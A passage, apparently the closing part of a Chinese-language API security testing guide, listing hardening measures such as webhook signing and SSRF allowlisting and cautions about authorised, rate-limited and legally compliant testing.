- **Webhook硬化**：强签名（HMAC-SHA256恒定时间比较）、全字段验签、timestamp+nonce+重放窗口、密钥轮换管理
- **供应链**：第三方URL白名单+SSRF防护、SDK版本锁定与漏洞扫描、Webhook来源IP校验
- **错误处理/最小数据**：统一错误、仅返回必要字段、敏感数据脱敏
- **日志监控**：异常访问模式（ID遍历、跨租户请求、令牌滥用）告警

## 注意事项

- **仅限授权测试**：API测试可能影响数据完整性，不执行破坏性操作
- **速率限制**：测试时控制速率，避免触发WAF/DoS防护
- **数据敏感**：API返回数据可能含大量敏感信息，不得泄露
- **LLM/MCP测试谨慎**：触发Agent工具调用可能产生实际副作用（转账/删除），先确认授权
- **版本问题**：生产环境常有多版本API并行，需逐一测试
- **GraphQL复杂度**：深度嵌套查询可能导致DoS，谨慎测试
- **合规要求**：遵守《网络安全法》《数据安全法》《个人信息保护法》，仅在授权范围内测试

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
